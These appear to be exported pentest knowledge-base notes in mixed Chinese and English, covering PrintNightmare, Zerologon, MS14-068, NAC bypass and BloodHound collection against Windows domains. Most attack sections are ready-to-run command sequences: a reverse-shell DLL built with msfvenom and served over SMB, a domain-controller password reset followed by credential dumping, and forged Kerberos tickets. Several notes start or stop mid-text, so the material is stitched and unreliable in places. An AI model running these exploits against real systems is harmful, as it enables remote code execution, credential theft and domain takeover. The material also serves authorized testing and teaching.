content: 来源路径： 02-知识点/域与Windows/CVE-2021-1675 & CVE-2021-34527 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # CVE-2021-1675 & CVE-2021-34527 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 CVE-2021-1675 & CVE-2021-34527 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 CVE-2021-1675 & CVE-2021-34527 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：PrintNightmare、Theory、The print spooler、Constraints、MS-RPRN conditional tree；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 PrintNightmare Theory The print spooler Constraints MS-RPRN conditional tree MS-PAR conditional tree Practice # 核心要点 "PrintNightmare" refers to an RCE (Remote Command Execution) 漏洞. If the vulnerable machine is configured to reject remote connection, this 漏洞 could still be exploited in an LPE (Local 权限提升) context. In a detailed blogpost (here), Cyberwatch describes that the 漏洞 lies in the functions allowing remote driver installation by users, RpcAddPrinterDriverEx and RpcAddPrinterDriver: The attacker stores the driver DLL file on a SMB share reachable from the server. The client creates a DRIVER INFO 2 object containing the path to the attacker's DLL and passes it into the DRIVER 容器 object. The client calls RpcAddPrinterDriverEx with the DRIVER 容器 to load the attacker's DLL into the server's dynamic library and with multiple bit values within the dwFileCopyFlags in order to 绕过 the SeLoadDriverPrivilege privilege verification by the server. The attacker's DLL is executed on the server within SYSTEM context. # 命令 / 载荷 / 操作片段 # 1. Practice 1234567891011121314# Check open pipesrpcdump.py @192.168.1.16 | egrep 'MS-RPRN|MS-PAR'# Create a DLL payload (reverse shell in this example)msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -o /workspace/smb/remote.dll# Host a SMB sharesmbserver.py -smb2support "WHATEVERNAME" /workspace/smb/# Start the listener (for the reverse shell)nc -lvnp $LOCAL_PORT# Run the exploitCVE-2021-1675.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP '\\$LOCAL_IP\$SHARE\remote.dll' # 2. Practice 12345678#LPEC:\SharpPrintNightmare.exe C:\addCube.dll#RCE using existing contextSharpPrintNightmare.exe '\\$LOCAL_IP\smb\addCube.dll' '\\$TARGET_IP'#RCE using runas /netonlySharpPrintNightmare.exe '\\$LOCAL_IP\smb\addCube.dll' '\\$TARGET_IP' $DOMAIN $USER $PASSWORD # 工具与参考入口 here DRIVER INFO 2 RpcAddPrinterDriverEx @StanHacked rpcdump.py msfvenom smbserver.py MS-RPRN abuse MS-PAR abuse https://github.com/cube0x0/CVE-2021-1675 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Concept #3: MS-NRPC signing and sealing don't rely on the same vulnerable mechanisms but are optional and can be ignored. Concept #4: machine accounts have an unlimited number of login attempts, hence allowing for an 认证 绕过 and the spoofing of these accounts thanks to concepts #1 and #2 (by using a plaintext filled with \x00 bytes and by doing enough attempts). Concept #5: the NetrServerPasswordSet2 call can be used to reset an account's 密码. The new 密码 structure to supply in this call has to be encrypted with the same vulnerable mechanisms stated in concepts #1 and #2. Concept #6: the 密码 structure can be filled with \x00 bytes, leading to the setting a new 密码 of a 0 characters length for the target account. Concept #7: all previous concepts can be chained to reset a domain controller's 密码 and obtain domain-admin privileges. Secura BV's scanning PoC Dirk-Jan's 利用 script # 命令 / 载荷 / 操作片段 # 1. 认证 relay technique 1ntlmrelayx -t dcsync://$domain_controller_2 -smb2support # 2. 认证 relay technique 1dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1 # 3. 密码 change ( ⚠️ disruptive) 1234567891011121314# Scan for the vulnerabilityzerologon-scan 'DC_name' 'DC_IP_address'# Exploit the vulnerability: set the NT hash to \x00*8zerologon-exploit 'DC_name' 'DC_IP_address'# Obtain the Domain Admin's NT hashsecretsdump -no-pass 'Domain'/'DC_computer_account$'@'Domain_controller'# Obtain the machine account hex encoded password with the domain admin credentialssecretsdump -hashes :'NThash' 'Domain'/'Domain_admin'@'Domain_controller'# Restore the machine account passwordzerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_address' -hexpass 'DC_hexpass' # 4. 密码 change ( ⚠️ disruptive) 1234567891011121314151617# Scan for the vulnerabilitylsadump::zerologon /target:'Domain_controller' /account:'DC_account$'# Exploit the vulnerability: set the NT hash to \x00*8lsadump::zerologon /exploit /target:'Domain_controller' /account:'DC_account$'# Obtain the krbtgt by DCSynclsadump::dcsync /domain:'Domain' /dc:'Domain_controller' /user:'Administrator' /authuser:'DC_account$' /authdomain:'Domain' /authpassword:'' /authntlm# Reset the DC account's password in AD and in its SAM baselsadump::postzerologon /target:'Domain_Controller' /account:'DC_account$'# (alternative to postezerologon) Find the previous NT hash//TODO# (alternative to postezerologon) Change the NT hash of the domain controller machine account in the AD back to its original valuelsadump::changentlm /server:'Domain_controller' /user:'DC_account$' /oldntlm:'31d6cfe0d16ae931b73c59d7e0c089c0' /newntlm:'previous_NThash' # 工具与参考入口 showcased by Dirk-jan Impacket ntlmrelayx Secura BV's scanning PoC Dirk-Jan's 利用 script Dirk-Jan's restore script Mimikatz lsadump::zerologon lsadump::dcsync lsadump::postzerologon lsadump::changentlm https://www.secura.com/blog/zero-logon https://github.com/dirkjanm/CVE-2020-1472 # In response to step (3), a new TGT containing the forged PAC will be received from the vulnerable KDC after its validation of the forged PAC (the 漏洞 happens here). The newly obtained TGT can be use like a 黄金票据，with pass-the-ticket, to perform privileged various actions. Referring to kekeo's wiki might help untangle some situations but errors like KDC ERR SUMTYPE NOSUPP (15) or KRB ERR GENERIC (60) when trying to use the generated .ccache ticket should mean the target is patched. This attack can be operated with pykek's ms14-068 Python script. The script can carry out the attack with a cleartext 密码 or with 哈希传递. # 命令 / 载荷 / 操作片段 # 1. Practice 12345# with a plaintext passwordms14-068.py -u "$BASICUSER"@"$DOMAIN_FQDN" -p "$PASSWORD" -s "$BASICUSER_SID" -d "$DC_HOST"# with pass-the-hashms14-068.py -u "$BASICUSER"@"$DOMAIN_FQDN" --rc4 "$NT_HASH" -s "$BASICUSER_SID" -d "$DC_HOST" # 2. Practice 1getST.py -k -no-pass -spn 'any_valid_spn' "$DOMAIN"/"$USER" # 3. Practice 1goldenPac.py "$DOMAIN_FQDN"/"$USER":"$PASSWORD"@"$DC_HOST" -dc-ip "$DC_IP" # 4. Practice 1msf6 > use admin/kerberos/ms14_068_kerberos_checksum # 5. Practice 123456789101112# NB : ms14068.exe can act in two ways# /ticket : Write the obtained ticket on disk with default name tgt.kirbi# /ptt : Pass-the-ticket by directly injecting the obtained TGT into LSA# with password# domain SID and user RID are automaticaly discoveredms14068.exe /domain:$domain /user:$user /password:$password /kdc:$VULN_KDC_FQDN# with an NT hash# AES-128 and AES-256 keys are also usable with /aes128 and /aes256 respectively# note that automatic discovery of the user SID is not possible when using hashms14068.exe /domain:$domain /user:$user /key:$krbtgt_NThash /sid:$DomainSID /rid:$userRelativeID /kdc:$KDC_FQDN # 工具与参考入口 here here kekeo pykek ms14-068 getST.py describeTicket.py kerberos:ptt goldenPac.py kekeo's documentation https://ruuand.github.io/MS14-068/ https://adsecurity.org/?p=525 https://adsecurity.org/?p=541 https://www.beyondtrust.com/blog/entry/a-quick-look-at-ms14-068 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

CSRF, pronounced "C surf"', a.k.a. XSS make user's browser execute client-side code (e.g. JavaScript) whereas CSRF make user's browser send HTTP requests. First of all, testers need to find insecure input vectors that allow client-side code (like JS) injection, just like XSS. This part will not be further detailed as it already is in the following page. Read the XSS article for more insight One of the most efficient and common CSRF protection is the usage of an anti-CSRF 令牌. title: Bypassing Network Access Control Systems 技术笔记
content: 来源路径： 02-知识点/域与Windows/Bypassing Network Access Control Systems 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Bypassing Network Access Control Systems 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Bypassing Network Access Control Systems 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Bypassing Network Access Control Systems 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Network Access Control、Theory、Basics、Infrastructure & auth flow、Offensive tooling (dropbox)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Network Access Control Theory Basics Infrastructure & auth flow Offensive tooling (dropbox) Hardware Initial setup DHCP configuration Wi-Fi configuration Abuse MAC-based only 认证 only MAC-based + 认证 Using a Hub Using a transparent bridge Mitigation # 核心要点 NAC (Network Access Control) acts as a kind of a gatekeeper to the local network infrastructure. It usually works with whitelists, blacklists, 认证 requirements or host scanning to restrict access and keep unwanted devices out of the network. 认证 with username & 密码 认证 with certificates Attackers trying to gain access to the internal network A device, known as "dropbox", is needed to carry out according attacks when conducting NAC penetration tests. The following setup is a commonly used for this type of engagement. There are several scenarios to take into consideration with specific 绕过 possibilities. by setting up each physical RJ45 port (i.e. the authenticator) in the building to do either MAC-based NAC or 802.1x -> MAC-based 绕过 start the nac 绕过 setup.sh script Wait until the script gathered the MAC address of the attacked system, the IP of the attacked system and the gateway's MAC address in order to perform the attack. If all went well the following info will show up and the device should be able to talk to the network: run other offensive 工具 for NTLM capture, relay, etc. Reduce the time for re - 认证 to minimize the hub attack scenario. Leaving ports open after a successful 802.1x 认证 for an hour will pose a much higher risk than 5 minutes. Use MACSec if possible. This will at least make it much harder for an attacker to gather the needed info to play for Man in the Middle. Monitor network traffic and detect attacks / unknown patterns (IDS/IPS/SIEM) Don't expose unneeded info. Stickers with IP/MAC addresses will make it much easier for an attacker. Same goes for access to IP phone or printer menus to gather network intel. Restrict them as much as possible. # 命令 / 载荷 / 操作片段 # 1. Initial setup 12345sudo apt-get install isc-dhcp-serversudo apt-get install hostapdsudo systemctl enable isc-dhcp-serversudo systemctl unmask hostapdsudo systemctl enable hostapd # 2. content: 来源路径： 02-知识点/域与Windows/BloodHound 图分析 ⚙️.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # BloodHound 图分析 ⚙️ [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 BloodHound 图分析 ⚙️ 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 BloodHound 图分析 ⚙️ 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Theory、Practice、Collection、Analysis；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Theory Practice Collection Analysis # 核心要点 It must be run from the context of a domain user, either directly through a logon or through another method such as runas (runas /netonly /user:$DOMAIN$USER) (see Impersonation). Alternatively, SharpHound can be used with the LdapUsername and LdapPassword flags for that matter. When running SharpHound from a runas /netonly-spawned command shell, you may need to let SharpHound know what username you are authenticating to other systems as with the OverrideUserName flag When obtaining a foothold on an AD domain, testers should first run SharpHound with all collection methods, and then start a loop collection to enumerate more sessions. This ingestor is not as powerful as the C# one. It lacks most GPO collection methods, but you can complete GPO collection with GPOHound. The good news is that it can do 哈希传递. It becomes really useful when compromising a domain account's NT 哈希. Once the collection is over, the data can be uploaded and analyzed in BloodHound 图分析 by doing the following. Run pre-built analytics queries to find common attack paths Run custom queries to help in finding more complex attack paths or interesting objects Find information about selected nodes: sessions, properties, group membership/members, local admin rights, Kerberos delegations, RDP rights, outbound/inbound control rights (ACEs), and so on Find help about edges/attacks (abuse, OPSEC considerations, references) # 命令 / 载荷 / 操作片段 # 1. Collection 1SharpHound.exe --collectionmethods All # 2. Collection 123456789# Perform stealth collection methodsSharpHound.exe --collectionmethods All --Stealth# Loop collections (especially useful for session collection)# e.g. collect sessions every 10 minutes for 3 hoursSharpHound.exe --collectionmethods Session --Loop --loopduration 03:00:00 --loopinterval 00:10:00# Use LDAPS instead of plaintext LDAPSharpHound.exe --secureldap # 3. Collection 1bloodhound.py --zip -c All -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -dc "$DC_HOST" -ns "$DC_IP" # 4. Collection 1rusthound --zip -d "$DOMAIN" -i "$DC_IP" -u "$USER@$DOMAIN" -p "$PASSWORD" -o "$OUTDIR" # 工具与参考入口 BloodHound 图分析 Neo4j sources builds here BloodHound 图分析.py GPOHound RustHound the BloodHound 图分析 GUI nodes edges Exegol's custom queries BloodHound 图分析 - quickwin CrackHound https://blog.riccardoancarani.it/BloodHound 图分析 - tips-and-tricks/ https://BloodHound 图分析.readthedocs.io/en/latest/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
